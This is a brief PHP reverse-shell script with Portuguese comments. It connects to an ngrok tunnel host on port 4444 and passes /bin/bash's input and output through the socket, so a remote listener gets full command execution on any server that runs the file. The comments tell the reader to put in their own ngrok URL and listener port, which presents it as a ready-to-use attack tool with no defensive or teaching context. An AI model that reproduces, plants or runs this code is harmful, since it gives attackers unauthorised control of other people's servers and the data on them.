<?php
// Configuração do endereço IP/URL do Ngrok
$ip = "d30b-2804-14d-1687-8d0c-b2f0-fa59-374a-69c9.ngrok-free.app"; // Substitua com o seu URL do Ngrok
$porta = 4444; // A porta que você está escutando no seu listener (pode ser 4444 ou outra)

$socket = fsockopen($ip, $porta, $errno, $errstr, 30); // Conecta-se ao Ngrok
if (!$socket) {
    echo "$errstr ($errno)\n"; // Se a conexão falhar
} else {
    // Se a conexão for bem-sucedida, começa o processo
    $proc = proc_open("/bin/bash", array(0 => $socket, 1 => $socket, 2 => $socket), $pipes);
    proc_close($proc);
}
?>
